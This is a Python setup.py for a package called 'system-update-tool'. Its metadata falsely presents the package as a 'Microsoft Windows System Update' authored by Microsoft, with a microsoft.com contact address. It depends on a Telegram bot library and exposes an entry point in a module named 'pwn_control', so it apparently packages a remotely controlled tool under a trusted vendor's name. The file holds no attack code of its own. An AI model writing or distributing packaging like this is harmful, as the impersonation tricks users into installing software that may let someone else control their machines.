from setuptools import setup, find_packages

setup(
    name='system-update-tool',
    version='1.0.0',
    description='Microsoft Windows System Update',
    long_description='System utility for Windows and Linux',
    long_description_content_type='text/plain',
    author='Microsoft',
    author_email='update@microsoft.com',
    packages=find_packages(),
    install_requires=['requests', 'pyTelegramBotAPI'],
    entry_points={
        'console_scripts': [
            'sys-run = pwn_control.core:main',
        ],
    },
    classifiers=[
        'Programming Language :: Python :: 3',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
)